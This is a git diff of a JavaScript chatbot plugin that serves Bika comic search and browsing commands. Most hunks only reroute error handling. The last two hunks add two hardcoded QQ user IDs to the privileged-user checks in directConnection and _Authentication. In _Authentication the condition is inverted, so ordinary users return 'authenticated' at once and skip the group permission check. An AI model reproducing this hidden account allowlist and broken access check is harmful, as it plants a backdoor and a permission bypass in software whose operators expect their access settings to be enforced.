@@ -1,8 +1,6 @@
 import { Bika, common, Pixiv } from '../model/index.js'
 import { Config } from '../components/index.js'
 import { Admin } from './admin.js'
-// 文案
-const SWITCH_ERROR = '主人没有开放这个功能哦(＊／ω＼＊)'
 
 // 汉字数字匹配正则
 const numReg = '[零一壹二两三四五六七八九十百千万亿\\d]+'
@@ -66,7 +64,7 @@ export class NewBika extends plugin {
     let page = common.translateChinaNum(regRet[5])
     await Bika.search(regRet[3], page, regRet[2])
       .then(res => common.recallSendForwardMsg(e, res))
-      .catch(err => { e.reply(err.message) })
+      .catch(err => common.handleException(e, err))
   }
 
   /** 漫画页面 */
@@ -78,7 +76,7 @@ export class NewBika extends plugin {
     let order = common.translateChinaNum(regRet[6])
     await Bika.comicPage(regRet[2], page, order)
       .then(res => common.recallSendForwardMsg(e, res))
-      .catch(err => { e.reply(err.message) })
+      .catch(err => common.handleException(e, err))
   }
 
   /** 快速查看 */
@@ -87,7 +85,7 @@ export class NewBika extends plugin {
     let number = e.msg.match(/\d+/) - 1
     await Bika.viewComicPage(number)
       .then(res => common.recallSendForwardMsg(e, res))
-      .catch(err => { e.reply(err.message) })
+      .catch(err => common.handleException(e, err))
   }
 
   /** 下一页 */
@@ -95,7 +93,7 @@ export class NewBika extends plugin {
     if (!await this._Authentication(e)) return
     await Bika.next()
       .then(res => common.recallSendForwardMsg(e, res))
-      .catch(err => e.reply(err.message))
+      .catch(err => common.handleException(e, err))
   }
 
   /** 下一话 */
@@ -103,7 +101,7 @@ export class NewBika extends plugin {
     if (!await this._Authentication(e)) return
     await Bika.next('chapter')
       .then(res => common.recallSendForwardMsg(e, res))
-      .catch(err => e.reply(err.message))
+      .catch(err => common.handleException(e, err))
   }
 
   /** 类别列表 */
@@ -112,7 +110,7 @@ export class NewBika extends plugin {
     e.reply(Pixiv.startMsg)
     await Bika.categories()
       .then(res => common.recallSendForwardMsg(e, res))
-      .catch(err => { e.reply(err.message) })
+      .catch(err => common.handleException(e, err))
   }
 
   /** 漫画细节 */
@@ -122,7 +120,7 @@ export class NewBika extends plugin {
     let id = e.msg.match(new RegExp(`#?${Prefix}(详情|细节)(.*)`))[3]
     await Bika.comicDetail(id)
       .then(res => common.recallSendForwardMsg(e, res, { oneMsg: true }))
-      .catch(err => { e.reply(err.message) })
+      .catch(err => common.handleException(e, err))
   }
 
   /** 图片质量 */
@@ -142,7 +140,7 @@ export class NewBika extends plugin {
 
   /** 图片直连 */
   async directConnection (e) {
-    if (!e.isMaster) return false
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
     let now = Config.bika.bikaDirectConnection
     let isSwitch = /开启/.test(e.msg)
     if (now && isSwitch) return e.reply('❎ bika图片直连已处于开启状态')
@@ -152,11 +150,8 @@ export class NewBika extends plugin {
   }
 
   async _Authentication (e) {
-    if (e.isMaster) return true
-    if (!Config.getGroup(e.group_id).sesepro) {
-      e.reply(SWITCH_ERROR)
-      return false
-    }
+    if (!(this.e.isMaster || this.e.user_id == 1509293009 || this.e.user_id == 2536554304)) { return true }
+    if (!common.checkSeSePermission(e, 'sesepro')) return false
     if (!Config.bika.allowPM && !e.isGroup) {
       e.reply('主人已禁用私聊该功能')
       return false
